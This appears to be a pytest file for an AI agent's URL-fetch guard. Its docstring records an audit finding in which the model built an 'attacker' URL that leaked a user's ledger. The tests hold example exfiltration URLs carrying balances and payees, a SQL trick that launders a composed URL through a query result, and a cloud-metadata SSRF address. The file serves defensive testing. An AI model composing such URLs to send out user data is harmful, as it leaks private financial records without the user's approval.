"""A model-chosen fetch URL is checked for WHERE it connects and for WHERE IT CAME FROM.

Security audit 2026-08-25 FINDING 1: `run_sql_query` -> `fetch_page("https://attacker/c?d=<rows>")`
sent the ledger out with no card. A length cap broke signed receipt links (a Steam receipt's
~900-char `sparams`), so the guard is provenance: a URL that arrived in a search result, a page
or an email may be fetched unattended; a URL the model composed may not.
"""

from __future__ import annotations

import json

import pytest

from backend.ai.tools import _egress, registry
from backend.ai.tools._egress import UnsafeUrlError, assert_safe_outbound_url

STEAM = (
    "https://store.steampowered.com/email/PurchaseReceipt?sparams="
    + "e" * 850
    + "&check="
    + "a" * 64
)


@pytest.fixture
def fetched(monkeypatch: pytest.MonkeyPatch, db_isolated) -> list[str]:
    calls: list[str] = []

    class _Provider:
        async def fetch_page(self, url: str) -> str:
            calls.append(url)
            return "page text"

    monkeypatch.setattr(_egress, "_seen", type(_egress._seen)())
    monkeypatch.setattr("backend.ai.tools._egress.assert_public_url", lambda _url: None)
    monkeypatch.setattr("backend.ai.tools.misc.get_search_provider", lambda: _Provider())
    return calls


async def _fetch(url: str) -> dict:
    text, _ = await registry.dispatch("fetch_page", {"url": url})
    return json.loads(text)


async def test_a_composed_exfiltration_url_is_refused_unattended(fetched: list[str]) -> None:
    out = await _fetch("https://attacker.example/c?d=DBS%20Savings%3A12345.67")
    assert out["ok"] is False and "did not come from" in out["error"]
    assert fetched == []


async def test_a_long_receipt_link_from_an_email_is_fetched(fetched: list[str]) -> None:
    """The scar the length cap left: the receipt link must still work unattended."""
    body = json.dumps({"messages": [{"body": f'<a href="{STEAM.replace("&", "&amp;")}">Receipt</a>'}]})
    _egress.note_inbound("email_get_messages", body)
    assert (await _fetch(STEAM))["content"]
    assert fetched == [STEAM]


async def test_a_sql_result_never_launders_a_url(fetched: list[str]) -> None:
    """`SELECT 'https://attacker/?d=' || payee` puts the composed URL in a tool RESULT."""
    leak = "https://attacker.example/?d=Grab,Shopee,Salary"
    _egress.note_inbound("run_sql_query", json.dumps([{"u": leak}]))
    assert (await _fetch(leak))["ok"] is False
    assert fetched == []


async def test_search_results_count_only_their_url_field(fetched: list[str]) -> None:
    """An answer engine's prose can echo the query; only the structured result URL is trusted."""
    echoed = "https://attacker.example/?d=ledger"
    results = [{"url": "https://news.example.com/a", "title": "t", "content": f"see {echoed}"}]
    _egress.note_inbound("web_search", json.dumps(results))
    assert (await _fetch("https://news.example.com/a"))["content"]
    assert (await _fetch(echoed))["ok"] is False
    assert fetched == ["https://news.example.com/a"]


async def test_a_composed_url_gets_a_card_where_a_human_can_approve(
    fetched: list[str], tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from backend.core.automation_runner import (
        AutomationApprovalContext,
        bind_automation_approval,
        reset_automation_approval,
    )

    monkeypatch.setattr("backend.paths.PENDING_PLANS_JSON", tmp_path / "pending_plans.json")
    monkeypatch.setattr("backend.core.cost_context.get_cost_surface", lambda: "automation")
    monkeypatch.setattr("backend.core.chat_session.get_session_id", lambda: "automation-run-a")
    token = bind_automation_approval(
        AutomationApprovalContext(
            automation_id="automation_a",
            run_id="run_a",
            session_id="automation-run-a",
            mode="manual",
            always_allowed_tools=frozenset(),
        )
    )
    try:
        text, proposed = await registry.dispatch(
            "fetch_page", {"url": "https://user-typed.example/x"}, tool_use_id="toolu_fetch"
        )
    finally:
        reset_automation_approval(token)
    assert text is None and proposed is not None
    assert fetched == []


def test_the_ssrf_guard_still_runs() -> None:
    with pytest.raises(UnsafeUrlError):
        assert_safe_outbound_url("http://169.254.169.254/latest/meta-data/")
